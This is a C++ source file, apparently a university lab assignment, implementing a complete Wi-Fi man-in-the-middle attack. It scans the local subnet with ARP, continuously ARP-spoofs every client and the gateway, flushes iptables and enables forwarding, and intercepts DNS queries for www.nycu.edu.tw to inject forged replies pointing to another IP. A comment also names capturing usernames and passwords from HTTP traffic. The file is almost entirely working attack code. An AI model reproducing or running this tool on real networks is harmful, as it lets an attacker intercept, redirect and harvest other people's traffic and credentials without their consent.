#include <iostream>
#include <iomanip>
#include <map>
#include <cstring>
#include <cstdlib>
#include <cstdio>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <unistd.h>
#include <netdb.h>
#include <sys/ioctl.h>
#include <memory>
#include <array>
#include <linux/if_ether.h> // Include the header file that defines "ETH_P_ARP"
#include <net/if_arp.h>     // for ARPHRD_ETHER and ARPOP_REQUEST
#include <netinet/ether.h>
#include <linux/if_packet.h> // Include the header file that defines "struct sockaddr_ll"
#include <net/ethernet.h>
#include <thread>
#include <atomic>
#include <linux/netfilter.h>
#include <libnetfilter_queue/libnetfilter_queue.h>
#include <linux/filter.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>

using namespace std;

#define ETHER_HEADER_LEN sizeof(struct ether_header)
#define ETHER_ARP_LEN sizeof(struct ether_arp)
#define ETHER_ARP_PACKET_LEN ETHER_HEADER_LEN + ETHER_ARP_LEN
#define IP_ADDR_LEN 4
#define BROADCAST_ADDR                     \
    {                                      \
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff \
    }

struct dnshdr
{
    uint16_t id;
    uint16_t flags;
    /* number of entries in the question section */
    uint16_t qucount;
    /* number of resource records in the answer section */
    uint16_t ancount;
    /* number of name server resource records in the authority records section*/
    uint16_t aucount;
    /* number of resource records in the additional records section */
    uint16_t adcount;
};

struct __attribute__((packed, aligned(2))) answer_section
{
    uint16_t name;
    uint16_t type;
    uint16_t class_;
    uint32_t ttl;
    uint16_t rdlength;
    // uint32_t rdata;
};

string gateway_ip;
string source_ip;
string interface;
string source_mac;
int ifindex;

struct ether_arp *fill_arp_request_packet(const unsigned char *src_mac_addr, const char *src_ip, const char *dst_ip)
{
    struct ether_arp *arp_packet;
    struct in_addr src_in_addr, dst_in_addr;
    unsigned char dst_mac_addr[ETH_ALEN] = BROADCAST_ADDR;
    // ip address translation
    inet_pton(AF_INET, src_ip, &src_in_addr);
    inet_pton(AF_INET, dst_ip, &dst_in_addr);

    // fill the arp packet
    arp_packet = (struct ether_arp *)malloc(ETHER_ARP_LEN);
    arp_packet->arp_hrd = htons(ARPHRD_ETHER);
    arp_packet->arp_pro = htons(ETHERTYPE_IP);
    arp_packet->arp_hln = ETH_ALEN;
    arp_packet->arp_pln = IP_ADDR_LEN;
    arp_packet->arp_op = htons(ARPOP_REQUEST);
    memcpy(arp_packet->arp_sha, src_mac_addr, ETH_ALEN);
    memcpy(arp_packet->arp_tha, dst_mac_addr, ETH_ALEN);
    memcpy(arp_packet->arp_spa, &src_in_addr, IP_ADDR_LEN);
    memcpy(arp_packet->arp_tpa, &dst_in_addr, IP_ADDR_LEN);

    return arp_packet;
}

struct ether_arp *fill_arp_reply_packet(const char *src_ip, const unsigned char *src_mac_addr, const char *dst_ip, const unsigned char *dst_mac_addr)
{
    struct ether_arp *arp_packet;
    struct in_addr src_in_addr, dst_in_addr;
    // ip address translation
    inet_pton(AF_INET, src_ip, &src_in_addr);
    inet_pton(AF_INET, dst_ip, &dst_in_addr);

    // fill the arp packet
    arp_packet = (struct ether_arp *)malloc(ETHER_ARP_LEN);
    arp_packet->arp_hrd = htons(ARPHRD_ETHER);
    arp_packet->arp_pro = htons(ETHERTYPE_IP);
    arp_packet->arp_hln = ETH_ALEN;
    arp_packet->arp_pln = IP_ADDR_LEN;
    arp_packet->arp_op = htons(ARPOP_REPLY);
    memcpy(arp_packet->arp_sha, src_mac_addr, ETH_ALEN);
    memcpy(arp_packet->arp_spa, &src_in_addr, IP_ADDR_LEN);
    memcpy(arp_packet->arp_tha, dst_mac_addr, ETH_ALEN);
    memcpy(arp_packet->arp_tpa, &dst_in_addr, IP_ADDR_LEN);

    return arp_packet;
}

string exec(const char *cmd)
{
    array<char, 128> buffer;
    string result;
    unique_ptr<FILE, decltype(&pclose)> pipe(popen(cmd, "r"), pclose);
    if (!pipe)
    {
        throw runtime_error("popen() failed!");
    }
    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr)
    {
        result += buffer.data();
    }
    return result;
}

map<string, string> devices;
void receive_arp_reply(int sock_raw_fd)
{
    unsigned char buffer[ETHER_ARP_PACKET_LEN];
    ssize_t length;
    fd_set readfds;
    struct timeval tv;
    int retval;
    // Wait up to 1 seconds.
    tv.tv_sec = 1;
    tv.tv_usec = 0;

    while (true)
    {
        FD_ZERO(&readfds);
        FD_SET(sock_raw_fd, &readfds);
        retval = select(sock_raw_fd + 1, &readfds, NULL, NULL, &tv);

        if (retval == -1)
        {
            cerr << "Error with select." << endl;
            break;
        }
        else if (retval)
        {
            length = recvfrom(sock_raw_fd, buffer, ETHER_ARP_PACKET_LEN, 0, NULL, NULL);
            if (length == -1)
            {
                cerr << "Error receiving packet." << endl;
            }
            else
            {
                // 解析 ARP 回覆
                struct ether_arp *arp_resp = (struct ether_arp *)(buffer + ETHER_HEADER_LEN);
                if (ntohs(arp_resp->arp_op) == ARPOP_REPLY)
                {
                    // Extract sender IP address
                    string sender_ip_str = inet_ntoa(*(struct in_addr *)arp_resp->arp_spa);

                    // Extract sender MAC address
                    char sender_mac_str[18];
                    sprintf(sender_mac_str, "%02x:%02x:%02x:%02x:%02x:%02x",
                            arp_resp->arp_sha[0], arp_resp->arp_sha[1], arp_resp->arp_sha[2],
                            arp_resp->arp_sha[3], arp_resp->arp_sha[4], arp_resp->arp_sha[5]);
                    // add to devices
                    devices[sender_ip_str] = sender_mac_str;
                }
            }
        }
        else
        {
            // No data within five seconds.
            break;
        }
    }
}
void arp_request(const char *if_name, const char *base_ip)
{
    struct sockaddr_ll saddr_ll;
    struct ether_header *eth_header;
    struct ether_arp *arp_packet;
    struct ifreq ifr;
    char buf[ETHER_ARP_PACKET_LEN];
    unsigned char src_mac_addr[ETH_ALEN];
    unsigned char dst_mac_addr[ETH_ALEN] = BROADCAST_ADDR;

    int sock_raw_fd, ret_len;

    if ((sock_raw_fd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) == -1)
    {
        cerr << "Error creating socket." << endl;
    }
    // cout << "Socket created: " << sock_raw_fd << endl;
    bzero(&saddr_ll, sizeof(struct sockaddr_ll));
    bzero(&ifr, sizeof(struct ifreq));
    memcpy(ifr.ifr_name, if_name, strlen(if_name));
    // cout << "Interface name: " << if_name << endl;
    // ifindex
    if (ioctl(sock_raw_fd, SIOCGIFINDEX, &ifr) < 0)
    {
        cerr << "Error getting index." << endl;
    }
    saddr_ll.sll_ifindex = ifr.ifr_ifindex;
    ifindex = ifr.ifr_ifindex;
    saddr_ll.sll_family = PF_PACKET;
    // cout << "Interface index: " << ifr.ifr_ifindex << endl;
    // local ip
    if (ioctl(sock_raw_fd, SIOCGIFADDR, &ifr) < 0)
        cerr << "Error getting src ip." << endl;
    char *src_ip = inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr);
    // cout << "local IP: " << src_ip << endl;

    // local mac
    if (ioctl(sock_raw_fd, SIOCGIFHWADDR, &ifr) < 0)
    {
        cerr << "Error getting MAC address." << endl;
    }
    memcpy(src_mac_addr, ifr.ifr_hwaddr.sa_data, ETH_ALEN);
    // store local MAC address
    char local_mac_str[18];
    sprintf(local_mac_str, "%02x:%02x:%02x:%02x:%02x:%02x",
            src_mac_addr[0], src_mac_addr[1], src_mac_addr[2],
            src_mac_addr[3], src_mac_addr[4], src_mac_addr[5]);
    source_mac = local_mac_str;
    // cout << "Local MAC: " << source_mac << endl;
    // thread receive_thread(receive_arp_reply, sock_raw_fd);

    for (int i = 1; i < 255; i++)
    {
        string dst_ip = string(base_ip) + "." + to_string(i);
        // cout << "IP: " << dst_ip << endl;
        bzero(buf, ETHER_ARP_PACKET_LEN);
        // ethheader
        eth_header = (struct ether_header *)buf;
        memcpy(eth_header->ether_shost, src_mac_addr, ETH_ALEN);
        memcpy(eth_header->ether_dhost, dst_mac_addr, ETH_ALEN);
        eth_header->ether_type = htons(ETHERTYPE_ARP);
        // arp packet
        arp_packet = fill_arp_request_packet(src_mac_addr, src_ip, dst_ip.c_str());
        memcpy(buf + ETHER_HEADER_LEN, arp_packet, ETHER_ARP_LEN);

        // sendto
        ret_len = sendto(sock_raw_fd, buf, ETHER_ARP_PACKET_LEN, 0, (struct sockaddr *)&saddr_ll, sizeof(struct sockaddr_ll));
        if (ret_len < 0)
        {
            cerr << "Error sending packet." << endl;
        }
    }
    receive_arp_reply(sock_raw_fd);
    // stop_receiving = true;
    // receive_thread.join();

    close(sock_raw_fd);
}

void list_devices()
{
    // get the interface name and gateway IP address
    gateway_ip = exec("ip route | grep default | awk '{print $3}'");
    gateway_ip.erase(gateway_ip.end() - 1);
    source_ip = exec("hostname -I");
    source_ip.erase(source_ip.end() - 1);
    // cout << "Gateway IP: " << gateway_ip << endl;
    // cout << "Source IP: " << source_ip << endl;
    // cout << "Interface: " << interface << endl;
    cout << "Available devices:\n";
    cout << "---------------------------------\n";
    cout << "IP\t\tMAC\n";
    cout << "---------------------------------\n";
    string base_ip = gateway_ip.substr(0, gateway_ip.find_last_of("."));
    arp_request(interface.c_str(), base_ip.c_str());
    for (auto it = devices.begin(); it != devices.end(); ++it)
    {
        if (it->first == gateway_ip)
            continue;
        cout << it->first << "\t" << it->second << endl;
    }
}
void arp_reply(const char *if_name, const char *src_ip, const unsigned char *src_mac_addr, const char *dst_ip, const unsigned char *dst_mac_addr)
{
    struct sockaddr_ll saddr_ll;
    struct ether_header *eth_header;
    struct ether_arp *arp_packet;
    struct ifreq ifr;
    char buf[ETHER_ARP_PACKET_LEN];
    int sock_raw_fd, ret_len;

    if ((sock_raw_fd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) == -1)
    {
        cerr << "Error creating socket." << endl;
    }
    // cout << "Socket created: " << sock_raw_fd << endl;
    bzero(&saddr_ll, sizeof(struct sockaddr_ll));
    bzero(&ifr, sizeof(struct ifreq));
    memcpy(ifr.ifr_name, if_name, strlen(if_name));
    // cout << "Interface name: " << if_name << endl;
    // ifindex
    if (ioctl(sock_raw_fd, SIOCGIFINDEX, &ifr) < 0)
    {
        cerr << "Error getting index." << endl;
    }
    saddr_ll.sll_ifindex = ifr.ifr_ifindex;
    saddr_ll.sll_family = PF_PACKET;
    // cout << "Interface index: " << ifr.ifr_ifindex << endl;

    bzero(buf, ETHER_ARP_PACKET_LEN);
    // ethheader
    eth_header = (struct ether_header *)buf;
    memcpy(eth_header->ether_shost, src_mac_addr, ETH_ALEN);
    memcpy(eth_header->ether_dhost, dst_mac_addr, ETH_ALEN);
    eth_header->ether_type = htons(ETHERTYPE_ARP);
    // arp packet
    arp_packet = fill_arp_reply_packet(src_ip, src_mac_addr, dst_ip, dst_mac_addr);
    memcpy(buf + ETHER_HEADER_LEN, arp_packet, ETHER_ARP_LEN);

    // sendto
    ret_len = sendto(sock_raw_fd, buf, ETHER_ARP_PACKET_LEN, 0, (struct sockaddr *)&saddr_ll, sizeof(struct sockaddr_ll));
    if (ret_len < 0)
    {
        cerr << "Error sending packet." << endl;
    }

    close(sock_raw_fd);
}

void keep_sending_arp_reply(unsigned char *source_mac_char, unsigned char *gateway_mac_char)
{
    while (true)
    {
        // iterate all devices
        for (auto it = devices.begin(); it != devices.end(); ++it)
        {
            // if the device is not the gateway and the source
            if (it->first != gateway_ip && it->first != source_ip)
            {
                // change string of mac to unsigned char[6]
                unsigned char target_mac_char[6];
                sscanf(it->second.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
                       &target_mac_char[0], &target_mac_char[1], &target_mac_char[2],
                       &target_mac_char[3], &target_mac_char[4], &target_mac_char[5]);

                // arpreply(interface, source_mac, source_ip, dst_ip, dst_mac)
                // send ARP reply to gateway // trick the gateway we are the victim
                arp_reply(interface.c_str(), it->first.c_str(), source_mac_char, gateway_ip.c_str(), gateway_mac_char);
                // send ARP reply to victim  // trick the victim we are the gateway
                arp_reply(interface.c_str(), gateway_ip.c_str(), source_mac_char, it->first.c_str(), target_mac_char);
            }
        }
        this_thread::sleep_for(chrono::microseconds(500));
    }
}

void send_spoofed_dns_reply(char *packet)
{
    // change the destination IP address to 140.113.24.241
    struct iphdr *ip_header = (struct iphdr *)packet;
    // exchange the source and destination IP address
    in_addr temp;
    ip_header->frag_off = 0;
    temp.s_addr = ip_header->saddr;
    ip_header->saddr = ip_header->daddr;
    ip_header->daddr = temp.s_addr;
    ip_header->protocol = IPPROTO_UDP;

    // change the source port and destination port
    struct udphdr *udp_header = (struct udphdr *)(packet + ip_header->ihl * 4);
    // exchange the source and destination port
    unsigned short temp_port = udp_header->source;
    udp_header->source = udp_header->dest;
    udp_header->dest = temp_port;
    // cout to check the source and destination port
    // cout << "Source Port: " << ntohs(udp_header->source) << endl;
    // cout << "Destination Port: " << ntohs(udp_header->dest) << endl;

    // change the DNS query to DNS reply
    struct dnshdr *dns_header = (struct dnshdr *)(packet + ip_header->ihl * 4 + sizeof(udphdr));
    dns_header->flags = htons(0x8180);
    dns_header->ancount = htons(1);
    dns_header->adcount = htons(0);
    dns_header->aucount = htons(0);

    // derive question section qname qtype qclass
    // move the pointer to the answer section
    char *dns_query = (char *)(packet + ip_header->ihl * 4 + sizeof(udphdr) + sizeof(dnshdr));
    // move the pointer to the answer section
    // char *dns_answer = (char *)(packet + ip_header->ihl * 4 + sizeof(udphdr) + sizeof(dnshdr));
    // derive the question section
    int queries_len = 0;
    while (*dns_query != 0)
    {
        queries_len = *dns_query;
        dns_query += queries_len + 1;
    }
    dns_query += 5;
    // cout position of dns_query
    // cout << "Position of dns_query: " << dns_query - packet << endl;
    


    // derive the answer section
    struct answer_section *answer = (struct answer_section *)dns_query;
    // memset 0
    memset(answer, 0, sizeof(struct answer_section));
    
    answer->name = htons(0xc00c);
    answer->type = htons(1);
    answer->class_ = htons(1);
    answer->ttl = htonl(5);
    answer->rdlength = htons(4);
    // derive the rdata
    unsigned char ip[4] = {140, 113, 24, 241};
    memcpy(dns_query + sizeof(answer_section), ip, 4);
    // cout << "Position of answer: " << answer - packet << endl;

    // calculate total length  
    int total_len = (dns_query - packet) + sizeof(answer_section) + 4;
    // cout << "Total length: " << total_len << endl;
    udp_header->len = htons(total_len - ip_header->ihl * 4);
    ip_header->tot_len = htons(total_len);

    // calculate udp checksum
    // packet - ip_header to get the udp datagram
    unsigned char *udp_datagram = (unsigned char *)udp_header;
    unsigned short udpLen = ntohs(udp_header->len); // Use ntohs to convert from network byte order to host byte order
    udp_header->check = 0;
    uint32_t sum = 0;
    sum += (ip_header->saddr >> 16) & 0xFFFF;
    sum += ip_header->saddr & 0xFFFF;
    sum += (ip_header->daddr >> 16) & 0xFFFF;
    sum += ip_header->daddr & 0xFFFF;
    sum += htons(IPPROTO_UDP);
    sum += udp_header->len;

    // Add the UDP datagram to the sum
    while (udpLen > 1) {
        sum += *((unsigned short *) udp_datagram);
        udp_datagram += 2;
        udpLen -= 2;
    }

    // If the length of the UDP datagram is odd, add the last byte to the sum
    if (udpLen == 1) {
        sum += *udp_datagram << 8; // Left shift by 8 bits because it's the high byte
    }

    // Add the carry
    while (sum >> 16) {
        sum = (sum & 0xFFFF) + (sum >> 16);
    }

    // Store the one's complement of sum in the checksum field of the UDP header
    udp_header->check = ~htons(sum);

    // calculate the ip checksum
    ip_header->check = 0;
    unsigned short *ip_checksum = (unsigned short *)ip_header;
    sum = 0;
    for (int i = 0; i < ip_header->ihl * 4 / 2; i++)
    {
        sum += ip_checksum[i];
    } 
    while (sum >> 16)
    {
        sum = (sum & 0xFFFF) + (sum >> 16);
    }
    ip_header->check = ~htons(sum);


    // send the spoofed DNS reply
    // attach eth header before packet

    struct ether_header *eth_header = (struct ether_header *)malloc(ETHER_HEADER_LEN);
    
    unsigned char source_mac_char[6];
    sscanf(source_mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &source_mac_char[0], &source_mac_char[1], &source_mac_char[2],
           &source_mac_char[3], &source_mac_char[4], &source_mac_char[5]);

    memcpy(eth_header->ether_shost, source_mac_char, ETH_ALEN);
    // get the destination MAC address
    string dst_ip = inet_ntoa(*(in_addr *)&ip_header->daddr);
    string dst_mac = devices[dst_ip];
    unsigned char dst_mac_addr[6];
    sscanf(dst_mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &dst_mac_addr[0], &dst_mac_addr[1], &dst_mac_addr[2],
           &dst_mac_addr[3], &dst_mac_addr[4], &dst_mac_addr[5]);


    memcpy(eth_header->ether_dhost, dst_mac_addr, ETH_ALEN);
    eth_header->ether_type = htons(ETH_P_IP);
    // attach the packet with eth header
    char *spoofed_packet = (char *)malloc(total_len + ETHER_HEADER_LEN);
    memset(spoofed_packet, 0, total_len + ETHER_HEADER_LEN);
    memcpy(spoofed_packet, eth_header, ETHER_HEADER_LEN);
    memcpy(spoofed_packet + ETHER_HEADER_LEN, packet, total_len);    

    // send the packet
    int sock_raw_fd;
    if ((sock_raw_fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_IP))) == -1)
    {
        cerr << "Error creating socket." << endl;
    }

    struct sockaddr_ll socket_address;
    memset(&socket_address, 0, sizeof(socket_address));
    socket_address.sll_ifindex = ifindex;
    socket_address.sll_halen = 6;
    socket_address.sll_protocol = htons(ETH_P_IP);
    socket_address.sll_family = AF_PACKET;
    socket_address.sll_pkttype = PACKET_BROADCAST;
    socket_address.sll_hatype = htons(ARPHRD_ETHER);
    memcpy(socket_address.sll_addr, source_mac_char, 6);

    if(sendto(sock_raw_fd, spoofed_packet, total_len + ETHER_HEADER_LEN, 0, (struct sockaddr *)&socket_address, sizeof(socket_address)) == -1)
    {
        cerr << "Error sending packet." << endl;
    }

    close(sock_raw_fd);
        
}
static int dns_nfq_packet_handler(struct nfq_q_handle *qh, struct nfgenmsg *nfmsg, struct nfq_data *nfa, void *data)
{
    char *packet;
    int id = 0;
    struct nfqnl_msg_packet_hdr *ph;
    ph = nfq_get_msg_packet_hdr(nfa);
    if (ph)
    {
        id = ntohl(ph->packet_id);
    }
    int ret = nfq_get_payload(nfa, reinterpret_cast<unsigned char **>(&packet));
    if (ret > 0)
    {
        // dns packet use udp protocol and destionation port 53
        // if detect dns query to www.nycu.edu.tw, then send spoofed DNS reply with IP: 140.113.24.241
        struct iphdr *ip_header = (struct iphdr *)packet;
        if (ip_header->protocol == IPPROTO_UDP)
        {
            // parse the ip header
            struct udphdr *udp_header = (struct udphdr *)(packet + ip_header->ihl * 4);
            // parse the udp header

            if (ntohs(udp_header->dest) == 53)
            {
                // parse the dns header
                //  struct dnshdr *dns_header = (struct dnshdr *)(packet + ip_header->ihl * 4 + sizeof(udphdr));
                //  //parse the dns query

                // char *dns_query = (char *)(packet + ip_header->ihl * 4 + sizeof(udphdr) + sizeof(dnshdr));
                // parse question section: qname qtype qclass

                // use stringstream to derive the dns query
                stringstream ss;
                for (int i = 0; i < ret; ++i)
                {
                    ss << packet[i];
                }
                string dns_query = ss.str();
                if (dns_query.find("nycu") != string::npos && dns_query.find("edu") != string::npos && dns_query.find("tw") != string::npos)
                {
                    // cout << "DNS query to www.nycu.edu.tw" << endl;
                    // send the spoofed DNS reply
                    // change the destination IP address to
                    send_spoofed_dns_reply(packet);
                    return nfq_set_verdict(qh, id, NF_DROP, 0, NULL);
                }
            }
        }
    }
    return nfq_set_verdict(qh, id, NF_ACCEPT, 0, NULL);
}

void analyze_packet()
{
    // filter the received packet: HTTP
    // continuously listen to the packets on the interface and filter the HTTP packets
    // analyze the every received HTTP POST packet, findout the packet with "txtUsername"
    // Set up packet capture filter to capture HTTP traffic (port 80)
    struct nfq_handle *h;
    struct nfq_q_handle *qh;
    struct nfnl_handle *nh;
    int fd;
    int rv;
    char buf[4096] __attribute__((aligned));
    h = nfq_open();
    if (!h)
    {
        cerr << "error during nfq_open()" << endl;
        exit(1);
    }
    if (nfq_unbind_pf(h, AF_INET) < 0)
    {
        cerr << "error during nfq_unbind_pf()" << endl;
        exit(1);
    }
    if (nfq_bind_pf(h, AF_INET) < 0)
    {
        cerr << "error during nfq_bind_pf()" << endl;
        exit(1);
    }
    qh = nfq_create_queue(h, 0, &dns_nfq_packet_handler, NULL);
    if (!qh)
    {
        cerr << "error during nfq_create_queue()" << endl;
        exit(1);
    }
    if (nfq_set_mode(qh, NFQNL_COPY_PACKET, 0xffff) < 0)
    {
        cerr << "can't set packet_copy mode" << endl;
        exit(1);
    }
    fd = nfq_fd(h);
    while ((rv = recv(fd, buf, sizeof(buf), 0)))
    {
        nfq_handle_packet(h, buf, rv);
    }
    nfq_destroy_queue(qh);
    nfq_close(h);
    exit(0);
}

void arp_spoofing()
{
    string gateway_mac = devices[gateway_ip];
    // cout << "Gateway IP: " << gateway_ip << endl;
    // cout << "Gateway MAC: " << gateway_mac << endl;
    // cout << "Source IP: " << source_ip << endl;
    // cout << "Source MAC: " << source_mac << endl;
    // change string of mac to unsigned char[6]
    unsigned char gateway_mac_char[6];
    sscanf(gateway_mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &gateway_mac_char[0], &gateway_mac_char[1], &gateway_mac_char[2],
           &gateway_mac_char[3], &gateway_mac_char[4], &gateway_mac_char[5]);
    // change string of mac to unsigned char[6]
    unsigned char source_mac_char[6];
    sscanf(source_mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &source_mac_char[0], &source_mac_char[1], &source_mac_char[2],
           &source_mac_char[3], &source_mac_char[4], &source_mac_char[5]);

    // thread to send ARP reply to gateway and victim
    thread arp_reply_thread(keep_sending_arp_reply, source_mac_char, gateway_mac_char);

    // task 3 :Fetch all the inputted usernames/passwords on a specific web pag  (Parse HTTP content and print out usernames/passwords)
    // thread analyze_thread(analyze_packet);

    // task 4 : Intercept DNS requests for a specific web page and generate spoofed DNS replies with the attack server’s IP
    // DNS request(domain name: www.nycu.edu.tw) -> DNS reply(IP: 140.113.24.241)
    thread analyze_thread(analyze_packet);

    arp_reply_thread.join();
    analyze_thread.join();
}

int main()
{
    interface = exec("ip route | grep default | awk '{print $5}'");
    interface.erase(interface.end() - 1);
    // cout << interface << "\n";
    system("sysctl -w net.ipv4.ip_forward=1 > /dev/null");
    system("iptables -F");
    system("iptables -F -t nat");

    system("iptables -A FORWARD -p udp --sport 53 -j NFQUEUE --queue-num 0");
    system("iptables -A FORWARD -p udp --dport 53 -j NFQUEUE --queue-num 0");
    // char cmd[100];
    // sprintf(cmd, "iptables -t nat -A POSTROUTING -o %s -j MASQUERADE", interface.c_str());
    // system(cmd);

    // task 1 : list all devices' IP/MAC addresses in the Wi-Fi network(except the attacker and gateway)
    list_devices();

    // task 2 : ARP spoofing for all other client devices in the Wi-Fi network
    arp_spoofing();

    return 0;
}